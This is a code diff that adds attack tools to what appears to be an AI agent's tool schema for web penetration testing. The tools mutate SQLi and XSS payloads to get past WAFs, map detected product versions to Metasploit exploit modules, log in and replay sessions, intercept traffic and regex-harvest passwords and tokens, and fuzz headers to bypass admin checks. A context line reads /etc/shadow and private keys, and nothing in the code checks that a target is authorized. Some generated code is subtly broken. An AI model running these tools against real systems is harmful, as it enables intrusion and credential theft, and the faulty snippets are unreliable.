@@ -491,6 +491,77 @@ TOOLS = {
             "required": ["pivot_host"]
         }
     },
+    "playwright_crawl": {
+        "description": "Real headless browser crawler using Playwright. Renders JavaScript, clicks buttons, fills forms, authenticates with real credentials, and discovers hidden endpoints in SPAs/React/Angular apps that curl-based crawlers miss.",
+        "input_schema": {
+            "type": "object",
+            "properties": {
+                "target":    {"type": "string", "description": "Base URL (e.g. http://site.com)"},
+                "username":  {"type": "string", "description": "Login username"},
+                "password":  {"type": "string", "description": "Login password"},
+                "login_url": {"type": "string", "description": "Login page URL (default: target/login)"},
+                "depth":     {"type": "integer", "description": "Click depth per page (default: 2)"},
+                "actions":   {"type": "string", "description": "Extra actions: screenshot, forms, api_calls, all (default: all)"}
+            },
+            "required": ["target"]
+        }
+    },
+    "adaptive_mutate": {
+        "description": "Intelligent payload mutation with real-time response analysis. Sends payload, reads WAF fingerprint from response headers/body, then generates targeted bypass variants. Adapts: if blocked → tries charencode+equaltolike; if error → tries time-based blind; if WAF detected → applies WAF-specific tamper chain.",
+        "input_schema": {
+            "type": "object",
+            "properties": {
+                "target":  {"type": "string", "description": "Target URL with injection point (e.g. http://site.com/page?id=INJECT)"},
+                "payload": {"type": "string", "description": "Base payload to adapt (e.g. ' OR 1=1--)"},
+                "type":    {"type": "string", "description": "Payload class: sqli, xss, lfi, rce (default: sqli)"},
+                "rounds":  {"type": "integer", "description": "Mutation rounds (default: 5)"}
+            },
+            "required": ["target", "payload"]
+        }
+    },
+    "cve_rag": {
+        "description": "CVE RAG (Retrieval-Augmented Generation) lookup. Given detected product + version, finds exact CVEs, CVSS scores, PoC links, and matching Metasploit modules. Smarter than generic search: queries NVD by CPE, filters by exploitability, and maps to msf module names automatically.",
+        "input_schema": {
+            "type": "object",
+            "properties": {
+                "product": {"type": "string", "description": "Product/service name (e.g. apache, wordpress, openssl, log4j, php, nginx)"},
+                "version": {"type": "string", "description": "Detected version (e.g. 2.4.49, 5.8.1, 1.0.2)"},
+                "severity":{"type": "string", "description": "Min severity: critical, high, medium (default: high)"},
+                "limit":   {"type": "integer", "description": "Max results (default: 10)"}
+            },
+            "required": ["product", "version"]
+        }
+    },
+    "session_manage": {
+        "description": "Persistent session management. Create and reuse cookie jars, extract CSRF tokens, store JWT tokens, replay authenticated requests, and manage multi-step auth flows across tool calls.",
+        "input_schema": {
+            "type": "object",
+            "properties": {
+                "action":   {"type": "string", "description": "Action: login (post creds+save cookie), get (fetch with saved cookie), csrf (extract token), jwt_decode (decode+check), replay (resend last request). Default: login"},
+                "target":   {"type": "string", "description": "URL to login or request"},
+                "username": {"type": "string", "description": "Username for login"},
+                "password": {"type": "string", "description": "Password for login"},
+                "cookie":   {"type": "string", "description": "Cookie string to use (if already have one)"},
+                "session_id":{"type": "string", "description": "Session file ID to reuse (default: kgb_session)"},
+                "data":     {"type": "string", "description": "POST data for login or replay (e.g. user=admin&pass=1234)"}
+            },
+            "required": ["target", "action"]
+        }
+    },
+    "mitmproxy_scan": {
+        "description": "Intercept, analyze and replay HTTP traffic using mitmproxy. Start a transparent proxy, drive a target through it, capture all requests/responses, then replay with mutations (header injection, param fuzzing, body manipulation).",
+        "input_schema": {
+            "type": "object",
+            "properties": {
+                "target":  {"type": "string", "description": "Target URL to proxy requests through"},
+                "port":    {"type": "integer", "description": "mitmproxy listen port (default: 8080)"},
+                "mode":    {"type": "string", "description": "Mode: intercept (capture traffic), replay (replay saved flows), fuzz (mutate+replay), analyze (parse saved flows for secrets). Default: intercept"},
+                "duration":{"type": "integer", "description": "Capture duration in seconds (default: 30)"},
+                "flows_file":{"type": "string", "description": "Path to saved mitmproxy flows file (for replay/analyze mode)"}
+            },
+            "required": ["target"]
+        }
+    },
     "waf_bypass": {
         "description": "Detect WAF and apply automatic bypass techniques. Uses wafw00f to identify WAF, then runs sqlmap/ffuf/nuclei with tamper scripts, random agents, and evasion flags to bypass protection.",
         "input_schema": {
@@ -915,6 +986,334 @@ echo "SUID binaries:" && find / -perm -4000 -type f 2>/dev/null | head -15 &&
 echo "Writable /etc:" && ls -la /etc/passwd /etc/shadow /etc/cron* 2>/dev/null &&
 echo "Sudo rules:" && sudo -l 2>/dev/null | head -10 &&
 echo "Interesting files:" && find /home /root /var/www /opt -name "*.conf" -o -name "*.env" -o -name "id_rsa" -o -name "*.pem" 2>/dev/null | head -20 2>&1 | head -80"""
+
+    elif tool == "playwright_crawl":
+        target    = shlex.quote(args['target'])
+        login_url = shlex.quote(args.get('login_url', args['target'].rstrip('/') + '/login'))
+        username  = shlex.quote(args.get('username', ''))
+        password  = shlex.quote(args.get('password', ''))
+        depth     = int(args.get('depth', 2))
+        script = f"""python3 - <<'PYEOF'
+import asyncio, json, sys
+try:
+    from playwright.async_api import async_playwright
+except ImportError:
+    print("INSTALL: pip3 install playwright && playwright install chromium")
+    sys.exit(0)
+
+async def run():
+    async with async_playwright() as p:
+        browser = await p.chromium.launch(headless=True, args=['--no-sandbox'])
+        ctx  = await browser.new_context(ignore_https_errors=True)
+        page = await ctx.new_page()
+        found_urls = set()
+        api_calls  = []
+
+        page.on("request",  lambda r: api_calls.append(f"REQ  {{r.method}} {{r.url}}")  if 'api' in r.url or r.method != 'GET' else None)
+        page.on("response", lambda r: api_calls.append(f"RESP {{r.status}} {{r.url}}") if r.status >= 400 else None)
+
+        # Login
+        if {username} and {password}:
+            print(f"[+] Logging in to {args.get('login_url', args['target'].rstrip('/')+'/login')}")
+            await page.goto({login_url}, timeout=15000)
+            await page.wait_for_load_state('networkidle', timeout=10000)
+            for sel in ['input[name=username]','input[name=user]','input[name=email]','input[type=email]']:
+                try: await page.fill(sel, {username}); break
+                except: pass
+            for sel in ['input[name=password]','input[name=pass]','input[type=password]']:
+                try: await page.fill(sel, {password}); break
+                except: pass
+            for sel in ['button[type=submit]','input[type=submit]','button:has-text("Login")','button:has-text("Sign")']:
+                try: await page.click(sel); break
+                except: pass
+            await page.wait_for_load_state('networkidle', timeout=8000)
+            print(f"[+] Post-login URL: {{page.url}}")
+
+        # Crawl
+        await page.goto({target}, timeout=15000)
+        await page.wait_for_load_state('networkidle', timeout=8000)
+        found_urls.add(page.url)
+
+        for _ in range({depth}):
+            links = await page.eval_on_selector_all('a[href]', 'els => els.map(e => e.href)')
+            new_links = [l for l in links if {args['target']!r} in l and l not in found_urls][:15]
+            for url in new_links:
+                try:
+                    await page.goto(url, timeout=8000)
+                    await page.wait_for_load_state('domcontentloaded', timeout=5000)
+                    found_urls.add(url)
+                    forms = await page.eval_on_selector_all('form', 'fs => fs.map(f => ({{action:f.action,method:f.method,inputs:[...f.querySelectorAll("input,select,textarea")].map(i=>i.name)}}))')
+                    if forms: print(f"FORMS at {{url}}: {{json.dumps(forms)}}")
+                except: pass
+
+        print("\\n=== DISCOVERED URLS ===")
+        for u in sorted(found_urls): print(u)
+        print("\\n=== API/XHR CALLS ===")
+        for a in api_calls[:60]: print(a)
+        await browser.close()
+
+asyncio.run(run())
+PYEOF"""
+        return script
+
+    elif tool == "adaptive_mutate":
+        target  = args['target']
+        payload = args['payload']
+        ptype   = args.get('type', 'sqli')
+        rounds  = int(args.get('rounds', 5))
+        script = f"""python3 - <<'PYEOF'
+import subprocess, urllib.parse, json, time
+
+TARGET  = {shlex.quote(target)}
+PAYLOAD = {shlex.quote(payload)}
+PTYPE   = {shlex.quote(ptype)}
+ROUNDS  = {rounds}
+
+def probe(url):
+    r = subprocess.run(['curl','-s','-o','/dev/null','-w','%{{http_code}}|%{{size_download}}',
+                        '-A','Mozilla/5.0','-m','10', url], capture_output=True, text=True)
+    return r.stdout.strip()
+
+def mutate(p, mode):
+    enc = urllib.parse.quote(p)
+    dbl = urllib.parse.quote(enc)
+    variants = {{
+        'space2comment': p.replace(' ', '/**/'),
+        'case_mix':      ''.join(c.upper() if i%2==0 else c.lower() for i,c in enumerate(p)),
+        'url_encode':    enc,
+        'double_encode': dbl,
+        'hex_encode':    ''.join(f'%{{ord(c):02x}}' for c in p),
+        'unicode':       p.replace("'", "%u0027").replace('"', "%u0022"),
+        'null_byte':     p + '%00',
+        'comment_split': p[:len(p)//2] + '/**/' + p[len(p)//2:],
+    }}
+    if PTYPE == 'sqli':
+        variants['equaltolike'] = p.replace('=', ' LIKE ')
+        variants['charencode']  = ','.join(f'CHAR({{ord(c)}})' for c in p[:20])
+        variants['between']     = p.replace('=1','BETWEEN 0 AND 2')
+        variants['time_based']  = p.replace('1=1','1=1 AND SLEEP(3)')
+    elif PTYPE == 'xss':
+        variants['tag_break']   = p.replace('<script>','<ScRiPt>').replace('</script>','</ScRiPt>')
+        variants['svg_xss']     = '<svg/onload=' + p.replace('<script>alert(','alert(').replace('</script>','') + '>'
+        variants['img_xss']     = '<img src=x onerror=' + p.replace('<script>','').replace('</script>','') + '>'
+    return variants
+
+base_url = TARGET.replace('INJECT', urllib.parse.quote(PAYLOAD))
+print(f"[+] BASE probe: {{base_url}}")
+base_resp = probe(base_url)
+code, size = base_resp.split('|') if '|' in base_resp else (base_resp,'?')
+print(f"    Response: HTTP {{code}}  Size: {{size}}")
+
+blocked = code in ('403','406','419','429','503') or size == '0'
+print(f"    Blocked: {{blocked}}")
+
+variants = mutate(PAYLOAD, PTYPE)
+print(f"\\n[+] Testing {{len(variants)}} adaptive variants ({{ROUNDS}} rounds)...")
+
+hits = []
+for i, (name, variant) in enumerate(variants.items()):
+    if i >= ROUNDS * 2: break
+    url = TARGET.replace('INJECT', urllib.parse.quote(variant))
+    resp = probe(url)
+    rc, sz = resp.split('|') if '|' in resp else (resp,'?')
+    status = "PASS" if rc not in ('403','406','419','429','503') and sz != '0' else "BLOCK"
+    if status == "PASS": hits.append((name, variant, rc, sz))
+    print(f"  [{{status}}] {{name:<20}} HTTP {{rc}}  Size {{sz}}")
+    time.sleep(0.3)
+
+print(f"\\n=== RESULTS: {{len(hits)}} bypasses found ===")
+for name, v, rc, sz in hits:
+    print(f"  [BYPASS] {{name}}: {{v[:80]}}")
+    print(f"           HTTP {{rc}}  Size {{sz}}")
+PYEOF"""
+        return script
+
+    elif tool == "cve_rag":
+        product  = shlex.quote(args['product'])
+        version  = shlex.quote(args['version'])
+        severity = args.get('severity', 'high').upper()
+        limit    = min(int(args.get('limit', 10)), 20)
+        MSF_MAP  = {
+            'log4j': 'exploit/multi/http/log4shell_header_injection',
+            'apache_2.4.49': 'exploit/multi/http/apache_normalize_path_rce',
+            'ms17-010': 'exploit/windows/smb/ms17_010_eternalblue',
+            'bluekeep': 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce',
+            'heartbleed': 'auxiliary/scanner/ssl/openssl_heartbleed',
+            'shellshock': 'exploit/multi/http/apache_mod_cgi_bash_env_exec',
+            'struts': 'exploit/multi/http/struts2_content_type_ognl',
+            'drupal': 'exploit/unix/webapp/drupal_drupalgeddon2',
+            'wordpress': 'exploit/unix/webapp/wp_admin_shell_upload',
+            'tomcat': 'exploit/multi/http/tomcat_jsp_upload_bypass',
+        }
+        return f"""python3 - <<'PYEOF'
+import urllib.request, json, urllib.parse
+
+PRODUCT  = {product}
+VERSION  = {version}
+SEVERITY = {shlex.quote(severity)}
+LIMIT    = {limit}
+
+MSF_MAP = {json.dumps(MSF_MAP)}
+
+keyword = f"{{PRODUCT}} {{VERSION}}"
+url = "https://services.nvd.nist.gov/rest/json/cves/2.0?" + urllib.parse.urlencode({{
+    "keywordSearch": keyword, "resultsPerPage": LIMIT, "cvssV3Severity": SEVERITY
+}})
+
+print(f"=== CVE RAG: {{PRODUCT}} {{VERSION}} (severity >= {{SEVERITY}}) ===")
+try:
+    req = urllib.request.Request(url, headers={{"User-Agent": "kgbtools-rag/1.0"}})
+    with urllib.request.urlopen(req, timeout=15) as r:
+        data = json.loads(r.read())
+    vulns = data.get("vulnerabilities", [])
+    print(f"Found {{len(vulns)}} CVEs (total: {{data.get('totalResults',0)}})")
+    for v in vulns:
+        cve   = v["cve"]
+        cid   = cve["id"]
+        desc  = (cve.get("descriptions") or [{{}}])[0].get("value","")[:150]
+        score = "N/A"
+        for key in ("cvssMetricV31","cvssMetricV30","cvssMetricV2"):
+            if key in cve.get("metrics",{{}}):
+                d     = cve["metrics"][key][0]["cvssData"]
+                sev   = cve["metrics"][key][0].get("baseSeverity","")
+                vec   = d.get("vectorString","")
+                score = f"{{d.get('baseScore','?')}} {{sev}}  [{{vec}}]"
+                break
+        refs  = [r["url"] for r in cve.get("references",[])[:3] if "github" in r["url"] or "exploit" in r["url"] or "poc" in r["url"].lower()]
+        msf   = next((v for k,v in MSF_MAP.items() if k in cid.lower() or k in PRODUCT.lower()), None)
+        print(f"\\n  [{{cid}}] CVSS: {{score}}")
+        print(f"  {{desc}}")
+        if refs: print(f"  PoC/Refs: {{', '.join(refs)}}")
+        if msf:  print(f"  MSF module: {{msf}}")
+except Exception as e:
+    print(f"[NVD error: {{e}}]")
+PYEOF"""
+
+    elif tool == "session_manage":
+        action     = args.get('action', 'login')
+        target     = shlex.quote(args['target'])
+        sess_id    = args.get('session_id', 'kgb_session')
+        cookie_jar = f"/tmp/{sess_id}_cookies.txt"
+        if action == "login":
+            user = shlex.quote(args.get('username', ''))
+            pw   = shlex.quote(args.get('password', ''))
+            data = shlex.quote(args.get('data', f"username={args.get('username','')}&password={args.get('password','')}"))
+            return f"""echo "=== SESSION LOGIN ===" &&
+curl -s -c {shlex.quote(cookie_jar)} -b {shlex.quote(cookie_jar)} \\
+  -X POST {target} \\
+  -d {data} \\
+  -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' \\
+  -L --max-redirs 5 -w "\\nHTTP: %{{http_code}}" 2>&1 | head -60 &&
+echo "\\n=== SAVED COOKIES ===" &&
+cat {shlex.quote(cookie_jar)} 2>/dev/null | grep -v '^#' | head -20"""
+        elif action == "get":
+            extra = shlex.quote(args.get('data', ''))
+            return f"""echo "=== SESSION GET (using saved cookies) ===" &&
+curl -s -c {shlex.quote(cookie_jar)} -b {shlex.quote(cookie_jar)} \\
+  {target} \\
+  -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' \\
+  -L --max-redirs 3 -w "\\nHTTP: %{{http_code}}" 2>&1 | head -80"""
+        elif action == "csrf":
+            return f"""echo "=== CSRF TOKEN EXTRACTION ===" &&
+curl -s -c {shlex.quote(cookie_jar)} -b {shlex.quote(cookie_jar)} {target} | \\
+  grep -oiE '(csrf|_token|authenticity_token|nonce)[^"]*"[^"]*"|value="[a-zA-Z0-9_/+=]{{20,}}"' | head -10"""
+        elif action == "jwt_decode":
+            jwt = shlex.quote(args.get('cookie', ''))
+            return f"""python3 - <<'PYEOF'
+import base64, json
+token = {jwt}
+parts = token.split('.')
+for i, part in enumerate(['Header','Payload']):
+    try:
+        pad = part + '=' * (-len(parts[i]) % 4)
+        decoded = json.loads(base64.urlsafe_b64decode(pad))
+        print(f"[{{part}}] {{json.dumps(decoded, indent=2)}}")
+        if i == 1:
+            import time
+            exp = decoded.get('exp')
+            if exp: print(f"  Expires: {{time.strftime('%Y-%m-%d %H:%M', time.gmtime(exp))}} ({'EXPIRED' if time.time() > exp else 'VALID'})")
+    except Exception as e:
+        print(f"[{{part}}] decode error: {{e}}")
+PYEOF"""
+        else:
+            return f"echo 'session_manage: unknown action {action}'"
+
+    elif tool == "mitmproxy_scan":
+        port      = int(args.get('port', 8080))
+        mode      = args.get('mode', 'intercept')
+        target    = shlex.quote(args['target'])
+        duration  = int(args.get('duration', 30))
+        flows_f   = shlex.quote(args.get('flows_file', '/tmp/kgb_flows.mitm'))
+
+        if mode == "intercept":
+            return f"""echo "=== MITMPROXY INTERCEPT (port {port}, {duration}s) ===" &&
+mkdir -p /tmp/kgb_mitm &&
+python3 - <<'PYEOF' &
+from mitmproxy.tools.main import mitmdump
+import sys, os
+sys.argv = ['mitmdump', '-p', '{port}', '-w', '/tmp/kgb_flows.mitm', '--quiet']
+mitmdump()
+PYEOF
+PROXY_PID=$!
+echo "Proxy PID: $PROXY_PID  Port: {port}" &&
+sleep 2 &&
+echo "Sending target through proxy..." &&
+curl -s --proxy http://127.0.0.1:{port} --insecure {target} -A 'Mozilla/5.0' -L -w "\\nHTTP: %{{http_code}}" 2>&1 | head -40 &&
+sleep 2 &&
+kill $PROXY_PID 2>/dev/null &&
+echo "\\n=== CAPTURED ===" &&
+python3 -c "
+from mitmproxy import io as mio
+with open('/tmp/kgb_flows.mitm','rb') as f:
+    for flow in mio.FlowReader(f).stream():
+        print(f'  {{flow.request.method}} {{flow.request.pretty_url}} -> {{flow.response.status_code if flow.response else \"?\"}}')" 2>&1 | head -50"""
+        elif mode == "analyze":
+            return f"""python3 - <<'PYEOF'
+from mitmproxy import io as mio
+import re, json
+SECRETS_RE = re.compile(r'(password|passwd|token|secret|api[_-]?key|auth|session|jwt|bearer)["\s:=]+([^\s"&{{}}]+)', re.I)
+try:
+    with open({flows_f}, 'rb') as f:
+        for flow in mio.FlowReader(f).stream():
+            req = flow.request
+            body = req.get_text() or ''
+            print(f"{{req.method}} {{req.pretty_url}}")
+            if req.headers: print(f"  Headers: {{dict(req.headers)}}")
+            if body: print(f"  Body: {{body[:200]}}")
+            for m in SECRETS_RE.finditer(body + str(dict(req.headers))):
+                print(f"  [SECRET] {{m.group(0)[:100]}}")
+            if flow.response:
+                rbody = flow.response.get_text() or ''
+                for m in SECRETS_RE.finditer(rbody[:2000]):
+                    print(f"  [RESP SECRET] {{m.group(0)[:100]}}")
+except Exception as e:
+    print(f"[error] {{e}}")
+PYEOF"""
+        elif mode == "fuzz":
+            return f"""python3 - <<'PYEOF'
+import subprocess, itertools
+TARGET = {target}
+FUZZ_HEADERS = [
+    {{'X-Forwarded-For': '127.0.0.1'}},
+    {{'X-Real-IP': '127.0.0.1'}},
+    {{'X-Originating-IP': '127.0.0.1'}},
+    {{'X-Custom-IP-Authorization': '127.0.0.1'}},
+    {{'X-Forwarded-Host': 'localhost'}},
+    {{'X-Original-URL': '/admin'}},
+    {{'X-Rewrite-URL': '/admin'}},
+]
+print("=== HEADER INJECTION FUZZ ===")
+for hdrs in FUZZ_HEADERS:
+    hdr_args = []
+    for k,v in hdrs.items(): hdr_args += ['-H', f'{{k}}: {{v}}']
+    r = subprocess.run(['curl','-s','-o','/dev/null','-w','%{{http_code}}|%{{size_download}}',
+        '-m','8','--insecure',TARGET]+hdr_args, capture_output=True, text=True)
+    code,sz = r.stdout.strip().split('|') if '|' in r.stdout else (r.stdout,'?')
+    flag = " *** INTERESTING ***" if code in ('200','301','302') else ""
+    print(f"  {{list(hdrs.keys())[0]}: {{list(hdrs.values())[0]:<20}} HTTP {{code}}  Size {{sz}}{{flag}}")
+PYEOF"""
+        else:
+            return f"echo 'mitmproxy_scan: unknown mode {mode}'"
 
     elif tool == "waf_bypass":
         target = shlex.quote(args['target'])
